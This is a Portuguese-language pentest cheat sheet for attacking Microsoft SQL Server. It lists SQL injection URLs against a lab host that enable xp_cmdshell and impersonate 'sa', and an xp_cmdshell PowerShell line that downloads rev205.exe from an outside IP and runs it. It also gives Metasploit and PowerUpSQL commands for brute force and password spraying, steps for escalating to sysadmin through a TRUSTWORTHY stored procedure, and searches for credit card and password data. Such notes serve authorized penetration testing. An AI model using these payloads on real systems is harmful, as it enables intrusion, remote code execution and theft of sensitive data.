## MS SQL 
	## UNION ALL 
		http://10.100.10.101/employee.asp?id=1%20UNION%20all%20select%20NULL,NULL,cast((SELECT%20@@servername)%20as%20varchar),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%20--
		http://10.100.10.101/employee.asp?id=1%20EXECUTE%20AS%20LOGIN%20=%20%27sa%27

		id=1 UNION all select NULL,NULL,cast((SELECT @@servername) as varchar),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL; --
		Metalica 'or UNION all select NULL,NULL; --
		yyy ' union select null,concat_ws(0x3a,table_schema,table_name,column_name),null from information_schema.columns for json auto--


		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1 EXEC sp_configure  'show advanced options', '1'
		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1 RECONFIGURE
		http://10.100.10.101/employee.asp?id=1 EXEC sp_configure 'xp_cmdshell', '1'
		http://10.100.10.101/employee.asp?id=1 EXECUTE AS LOGIN = 'sa'
		http://10.100.10.101/employee.asp?id=1%20EXEC%20xp_cmdshell%20%27whoami%27
		EXEC xp_cmdshell 'COMANDO'
		EXEC xp_cmdshell 'powershell -Sta -Nop -Window Hidden -Command "curl http://192.168.119.205/rev205.exe -OutFile rev.exe"'
		EXEC xp_cmdshell '.\rev.exe'
		cast((SELECT%20@@servername)%20as%20varchar)
		cast((SELECT STRING_AGG(select name from sys.ssyslogins , ';')) as varchar)
		select group_concat name from sys.syslogins


	# Comandos MSSQL 
		SELECT @@servername
		

		SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
		EXEC xp_cmdshell 'whoami'
		# Database links 
			SELECT * FROM master..sysservers
			SELECT * FROM OPENQUERY("UATSERVER\DB2", 'select * from master..sysservers')

		
		# Stored Procedure 
		SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'

		
	# Enumeração a partir de usuário desautenticado 
		# CMD 
		sqlcmd -L 
		# Metasploit 
		msf > use auxiliary/scanner/mssql/mssql_ping
		msf > set RHOSTS Range 
		msf > use scanner/mssql/mssql_login #Bruteforce ou PasswordSpraying
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceScanUDP
	# Enumeração a partir de usuário local
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceLocal
	# Enumeração a partir de usuário do domínio 
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
		Get-SQLInstanceDomain 
		Get-NetComputer -SPN mssql*
		setspn -T domain -Q MSSQLSvc/*

	# Foothold incial - Força bruta 
		# POwershell - PowerUp
		import-module .\PowerUpSQL.psd1
			# teste de login fraco
			Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw -Verbose
			Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
			# teste de credencial padrão
			Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw
			Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw 
			# teste manual 
			Get-SQLInstanceScanUDP | Get-SqlConnectionTestThreaded -Username fulano -Password senha 
			# Teste de de conexão com conta atual 
			Get-SQLInstanceDomain | Get-SQLConnectionTest 
			Get-SQLInstanceLocal | Get-SQLConnectionTest


			$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like "Accessible"}
			$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}

	# Execucao de comando 
		SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
		EXEC xp_cmdshell 'powershell $host.version'

		# PowerUPSql
			>> $Targets | Invoke-SQLOSCLR -Verbose -Command "Whoami"
			>> $Targets | Invoke-SQLOSOle -Verbose -Command "Whoami"
			>> $Targets | Invoke-SQLOSR -Verbose -Command "Whoami"

	### Escalação de privilégios para SysAdmin ###
		# 1 - Senha fraca e Blind SQL Server Login enumeration
			# Listar todos do Server Logins 
			SELECT name FROM sys.syslogins
			SELECT name FROM sys.server_principals 

			# Fuzzing de usuários 
				SELECT SUSER_NAME (1)
				SELECT SUSER_NAME (2)
				...

			# Blind SQL Server Login Enumeration 
			Get-SQLFuzzServerLogin –Instance ComputerName\InstanceName
			Get-SQLFuzzDomainAccount –Instance ComputerName\InstanceName

		# 2 - Impersonate Privilege 
			# Checar manualmente se pode personificar o sa 
				SELECT SYSTEM_USER
				SELECT IS_SRVROLEMEMBER('sysadmin')
				
				EXECUTE AS LOGIN = 'sa'
				
				SELECT SYSTEM_USER
				SELECT IS_SRVROLEMEMBER('sysadmin')

			# Metasploit 
				auxiliary/admin/mssql/mssql_escalate_execute_as
				use exploit/windows/mssql/mssql_payload

		# 3 - Stored Procedure and Trigger Creation
			# A) Procurar por databases que sao do sysadmin e que sao TRUSTWORTHY 
				SELECT SUSER_SNAME(owner_sid) AS DBOWNER, d.name AS DATABASENAME
				FROM sys.server_principals r 
				INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
				INNER JOIN sys.server_principals p ON 
				p.principal_id = m.member_principal_id
				inner join sys.databases d on suser_sname(d.owner_sid) = p.name
				WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') AND r.type = 'R' AND r.name = N'sysadmin'
			# B) criar um processo que roda com sa como dono 
				USE AdventureWork2008 
				GO 
				CREATE PROCEDURE sp_elavate_me
				WITH EXECUTE AS OWNER 
				AS EXEC sp_addsrvrolemember 'AdventureWorkUser1','sysadmin'
				GO 

			# C) Executar o processo stored 
				USE AdventureWork2008
				EXEC sp_elavate_me

			# D) Verificar se está como sysadmin
				SELECT is_srvrolemember('sysadmin')

			# Metasploit - Faz reconhecimento e esploração automáticamente 
				auxiliary/admin/mssql/mssql_escalate_dbowner
				auxiliary/admin/mssql/mssql_escalate_dbowner_sqli



		# UNC Path Injection 

		### Ver conteúdo Sensível pode ser feito após ter personificado o sysadmin
			# PowerUPSQL 
			Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "credit,ssn,password,pass" -SampleSize 2 -ValidateCC -NoDefaults

			Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded Verbose –Threads 10 -NoDefaults | Where-Object {$_.is_encrypted –eq "TRUE"} | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults

		### Extrair SQL Server Login hashes

